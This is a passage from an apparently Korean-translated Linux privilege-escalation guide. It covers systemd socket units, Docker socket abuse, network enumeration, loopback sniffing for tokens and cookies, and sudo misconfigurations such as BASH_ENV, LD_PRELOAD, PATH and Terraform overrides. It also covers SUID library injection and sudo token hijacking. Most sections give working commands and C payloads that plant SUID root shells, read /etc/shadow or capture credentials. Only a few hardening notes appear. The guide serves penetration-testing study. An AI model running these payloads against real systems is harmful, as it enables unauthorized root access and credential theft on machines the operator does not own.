```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 쓰기 가능한 sockets

만약 **쓰기 가능한 socket**을 식별한다면 (_지금은 Unix Sockets를 말하는 것이며 설정 `.socket` 파일이 아닙니다_), 해당 socket과 **통신할 수 있으며** 잠재적으로 취약점을 악용할 수도 있습니다.

### Unix Sockets 열거
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

일부 **sockets listening for HTTP** 요청이 있을 수 있다는 점에 유의하세요 (_여기서 말하는 것은 .socket 파일이 아니라 unix sockets로 동작하는 파일들입니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
해당 소켓이 **HTTP 요청에 응답**한다면, **통신**이 가능하고 어쩌면 **취약점을 악용**할 수 있습니다.

### 쓰기 가능한 Docker 소켓

Docker 소켓은 종종 `/var/run/docker.sock`에 위치하며, 보호되어야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 멤버들이 이 파일에 쓰기 권한을 가집니다. 이 소켓에 대한 쓰기 권한을 가지면 Privilege Escalation으로 이어질 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없을 때의 대체 방법에 대한 설명입니다.

#### **Privilege Escalation with Docker CLI**

Docker 소켓에 대한 쓰기 권한이 있다면, 다음 명령어들을 사용해 Privilege Escalation을 수행할 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉터리를 마운트하는 container를 생성하도록 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`를 사용해 container에 연결을 수립하면 그 안에서 명령을 실행할 수 있습니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### 기타

docker 그룹(`docker`)에 속해 있어 docker socket에 대한 쓰기 권한이 있는 경우 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)를 사용할 수 있다는 점을 유의하세요. 또한 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) 경우에도 이를 악용할 수 있습니다.

다음에서 **more ways to break out from containers or abuse container runtimes to escalate privileges** 를 확인하세요:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is a sophisticated **inter-Process Communication (IPC) system** that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.

The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of **enhanced UNIX domain sockets**. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.

D-Bus operates on an **allow/deny model**, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.

An example of such a policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` is provided, detailing permissions for the root user to own, send to, and receive messages from `fi.w1.wpa_supplicant1`.

Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus communication을 enumerate하고 exploit하는 방법을 배우세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하고 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

호스트에서 명령을 실행할 수 있는데 callbacks가 실패하면, DNS, transport, proxy, 및 route 필터링을 빠르게 분리하세요:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 열린 포트

접근하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
바인드 대상에 따라 리스너 분류:

- `0.0.0.0` / `[::]`: 모든 로컬 인터페이스에 노출됨.
- `127.0.0.1` / `::1`: 로컬 전용 (good tunnel/forward candidates).
- 특정 내부 IP(예: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 보통 내부 세그먼트에서만 접근 가능.

### 로컬 전용 서비스 트리아지 워크플로우

호스트를 compromise하면, `127.0.0.1`에 바인드된 서비스는 종종 쉘에서 처음으로 접근 가능해집니다. 빠른 로컬 워크플로우는 다음과 같습니다:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS를 네트워크 스캐너로서 사용하기 (network-only mode)

로컬 PE 검사 외에도, linPEAS는 집중된 네트워크 스캐너로 실행될 수 있습니다. 사용 가능한 바이너리를 `$PATH`에서 사용하며(일반적으로 `fping`, `ping`, `nc`, `ncat`), 도구를 설치하지 않습니다.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
만약 `-d`, `-p`, 또는 `-i`를 `-t` 없이 전달하면, linPEAS는 순수한 네트워크 스캐너로 동작합니다(나머지 privilege-escalation checks는 건너뜁니다).

### Sniffing

sniff traffic가 가능한지 확인하세요. 가능하다면 일부 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
빠른 실무 점검:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
루프백 (`lo`)은 post-exploitation에서 특히 유용합니다. 많은 내부 전용 서비스가 그곳에 tokens/cookies/credentials를 노출하기 때문입니다:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
지금 캡처하고, 나중에 파싱:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 사용자

### 일반 열거

자신이 **who**인지, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 누가 **login**할 수 있는지, 그리고 누가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

당신이 루트 권한을 부여할 수 있는 어떤 그룹의 **멤버인지** 확인하세요:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

가능하다면 클립보드에 흥미로운 내용이 있는지 확인하세요.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 passwords

환경의 **password를 알고 있다면**, 그 password를 사용해 **각 user로 login해보세요**.

### Su Brute

소음이 많이 발생하는 것을 개의치 않고 대상 시스템에 `su`와 `timeout` 바이너리가 있다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 user를 brute-force해볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 `-a` 파라미터로 user를 brute-force하려고 시도하기도 합니다.

## Writable PATH abuses

### $PATH

$PATH의 어떤 폴더에 **write할 수 있다면** 해당 쓰기 가능한 폴더 안에 다른 user(이상적으로는 root)가 실행할 명령어 이름으로 **backdoor를 생성**함으로써 권한을 상승시킬 수 있습니다. 단, 그 명령어는 $PATH에서 당신의 쓰기 가능한 폴더보다 앞에 위치한 폴더에서 **로드되지 않아야** 합니다.

### SUDO and SUID

sudo를 사용해 특정 명령을 실행할 수 있거나, 해당 파일에 suid 비트가 설정되어 있을 수 있습니다. 확인하려면 다음을 사용하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽고/또는 쓰거나 심지어 명령을 실행할 수 있게 합니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 다른 사용자의 권한으로 비밀번호를 알지 못해도 일부 명령을 실행할 수 있도록 허용할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예제에서는 사용자 `demo`가 `root` 권한으로 `vim`을 실행할 수 있으므로, root directory에 ssh key를 추가하거나 `sh`를 호출하면 쉘을 얻는 것이 매우 간단합니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시어는 사용자가 무언가를 실행하는 동안 **환경 변수를 설정**할 수 있게 해줍니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **based on HTB machine Admirer**이며, 스크립트를 root로 실행할 때 임의의 python 라이브러리를 로드하도록 **PYTHONPATH hijacking**에 **vulnerable**했습니다:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV가 sudo env_keep을 통해 보존됨 → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 작동 원리: 비대화형 셸의 경우, Bash는 `$BASH_ENV`를 평가하고 대상 스크립트를 실행하기 전에 해당 파일을 소스합니다. 많은 sudo 규칙은 스크립트나 셸 래퍼를 실행할 수 있도록 허용합니다. 만약 `BASH_ENV`가 sudo에 의해 보존된다면, 해당 파일이 root 권한으로 소스됩니다.

- 요구 사항:
- 실행 가능한 sudo 규칙(비대화형으로 `/bin/bash`를 호출하는 대상이나, 어떤 bash 스크립트).
- `env_keep`에 `BASH_ENV`가 포함되어 있어야 함 (`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 하드닝:
- `env_keep`에서 `BASH_ENV`(및 `ENV`)를 제거하고, `env_reset`을 선호하세요.
- sudo로 허용된 명령에 대해 쉘 래퍼를 피하고, 최소한의 바이너리를 사용하세요.
- 보존된 환경 변수가 사용될 때 sudo I/O 로깅과 알림을 고려하세요.

### Terraform: sudo로 HOME이 보존된 경우 (!env_reset)

sudo가 환경을 그대로 두고 (`!env_reset`) `terraform apply`를 허용하면, `$HOME`은 호출 사용자로 유지됩니다. 따라서 Terraform은 루트로서 **$HOME/.terraformrc**를 로드하고 `provider_installation.dev_overrides`를 반영합니다.

- 필요한 provider를 쓰기 가능한 디렉터리로 가리키게 하고, provider 이름을 딴 악성 플러그인(예: `terraform-provider-examples`)을 배치하세요:
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform은 Go plugin handshake에 실패하지만, 죽기 전에 payload를 root로 실행해 SUID shell을 남깁니다.

### TF_VAR 재정의 + symlink 검증 우회

Terraform 변수는 `TF_VAR_<name>` 환경 변수로 제공될 수 있으며, sudo가 환경을 보존할 때 유지됩니다. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 같은 약한 검증은 symlinks로 우회할 수 있습니다:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform은 symlink를 해석해 실제 `/root/root.txt`를 공격자가 읽을 수 있는 위치로 복사합니다. 동일한 방법으로, 대상 symlink를 미리 생성해(예: provider의 목적지 경로를 `/etc/cron.d/` 안을 가리키게) 특권 경로에 **쓰기**할 수도 있습니다.

### requiretty / !requiretty

일부 오래된 배포판에서는 sudo가 `requiretty`로 설정될 수 있으며, 이 경우 sudo는 인터랙티브 TTY에서만 실행되도록 강제됩니다. `!requiretty`가 설정되어 있거나 해당 옵션이 없으면, sudo는 reverse shells, cron jobs 또는 스크립트와 같은 비대화형 컨텍스트에서도 실행될 수 있습니다.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

만약 `sudo -l`가 `env_keep+=PATH`를 표시하거나 공격자가 쓸 수 있는 항목(예: `/home/<user>/bin`)을 포함하는 `secure_path`가 설정되어 있다면, sudo로 허용된 대상 내부의 상대 경로 명령은 대체될 수 있습니다.

- Requirements: 절대 경로를 사용하지 않고 명령을 호출하는 스크립트/바이너리를 실행하는 sudo 규칙(종종 `NOPASSWD`)과, 먼저 검색되는 쓰기 가능한 PATH 항목.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 실행 우회 경로
**바로 이동**하여 다른 파일을 읽거나 **symlinks**를 사용하세요. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 더 쉬워집니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

만약 **sudo permission**이 단일 명령어에 대해 **경로를 지정하지 않고** 부여되어 있다면: _hacker10 ALL= (root) less_ PATH variable을 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** binary가 **경로를 지정하지 않고 다른 명령을 실행할 때(항상 _**strings**_로 이상한 SUID binary의 내용을 확인하세요)**에도 사용할 수 있습니다.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary (명령 경로 포함)

만약 **suid** binary가 **경로를 지정하여 다른 명령을 실행한다면**, suid 파일이 호출하는 명령 이름으로 **export a function**을 시도해볼 수 있습니다.

예를 들어, 만약 suid binary가 _**/usr/sbin/service apache2 start**_를 호출한다면, 함수를 생성하고 이를 export해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음 suid 바이너리를 호출하면 이 함수가 실행됩니다.

### SUID 래퍼에 의해 실행되는 쓰기 가능한 스크립트

일반적인 custom-app 잘못된 설정 사례는 root-owned SUID 바이너리 래퍼가 스크립트를 실행하지만, 그 스크립트 자체는 low-priv users가 쓰기 가능한 경우입니다.

일반적인 패턴:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh`이(가) 쓰기 가능하면, payload 명령을 추가한 뒤 SUID wrapper를 실행할 수 있습니다:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
빠른 점검:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 하나 이상의 shared libraries (.so files)를 로더가 표준 C 라이브러리(`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 로드하도록 지정하는 데 사용됩니다. 이 과정을 라이브러리 사전 로드(preloading)라고 합니다.

그러나 시스템 보안을 유지하고 특히 **suid/sgid** 실행 파일에서 이 기능의 악용을 방지하기 위해 시스템은 다음과 같은 조건을 적용합니다:

- 로더는 real user ID (_ruid_)가 effective user ID (_euid_)와 일치하지 않는 실행 파일에 대해 **LD_PRELOAD**를 무시합니다.
- suid/sgid가 설정된 실행 파일의 경우, 사전 로드되는 라이브러리는 표준 경로에 있고 또한 suid/sgid인 라이브러리로만 제한됩니다.

Privilege escalation은 `sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문구가 포함된 경우 발생할 수 있습니다. 이 구성은 `sudo`로 명령이 실행될 때에도 **LD_PRELOAD** 환경 변수가 유지되고 인식되도록 허용하여, 결과적으로 향상된 권한으로 임의의 코드가 실행될 가능성이 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음 파일로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **compile it** 하려면 다음을 사용하세요:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges**를 실행
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 유사한 privesc는 공격자가 **LD_LIBRARY_PATH** 환경 변수를 제어하는 경우 악용될 수 있습니다. 이는 라이브러리를 검색할 경로를 공격자가 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

정상적이지 않아 보이는 **SUID** 권한을 가진 바이너리를 발견하면, 해당 바이너리가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령을 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류가 발생하면 잠재적인 exploitation 가능성을 시사합니다.

이를 exploit하려면, 예를 들어 _"/path/to/.config/libcalc.c"_ 라는 C 파일을 생성하고 다음 코드를 포함시킵니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되어 실행되면 파일 권한을 조작하고 권한이 상승된 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위의 C 파일을 shared object (.so) 파일로 컴파일하려면 다음을 사용하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID binary를 실행하면 exploit이 트리거되어 잠재적인 system compromise를 초래할 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID binary를 찾았으므로, 해당 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 는 로컬 보안 제한을 우회하기 위해 공격자가 악용할 수 있는 Unix 바이너리의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **인자만 주입할 수 있는** 경우를 위한 동일한 목록입니다.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- 이미 사용자 "_sampleuser_" 로 쉘을 가지고 있어야 합니다.
- "_sampleuser_" 가 최근 **15분 이내에** 무언가를 실행하기 위해 **`sudo`를 사용한 적이 있어야 합니다** (기본적으로 이는 비밀번호 없이 `sudo`를 사용할 수 있게 해주는 sudo token의 지속 시간입니다)
- `cat /proc/sys/kernel/yama/ptrace_scope` 값이 0이어야 합니다
- `gdb` 에 접근할 수 있어야 합니다 (업로드할 수 있어야 합니다)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 첫 번째 익스플로잇(`exploit.sh`)은 _/tmp_에 `activate_sudo_token` 바이너리를 생성합니다. 이를 사용해 **세션에서 sudo token을 활성화할 수 있습니다** (자동으로 root 쉘을 얻지는 못합니다. `sudo su`를 실행하세요):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`)는 _/tmp_에 sh shell을 **root 소유이며 setuid가 설정된** 상태로 생성합니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 exploit** (`exploit_v3.sh`)는 **sudoers file**을 생성하여 **sudo tokens을 영구화하고 모든 사용자가 sudo를 사용할 수 있게 합니다**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

해당 폴더 또는 폴더 내부에 생성된 파일들에 대해 **write permissions**가 있으면, 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용하여 **create a sudo token for a user and PID**할 수 있습니다.\
예를 들어, 파일 _/var/run/sudo/ts/sampleuser_을 덮어쓸 수 있고 해당 user로서 PID 1234인 shell을 가지고 있다면, 비밀번호를 알 필요 없이 다음을 수행하여 **obtain sudo privileges**할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

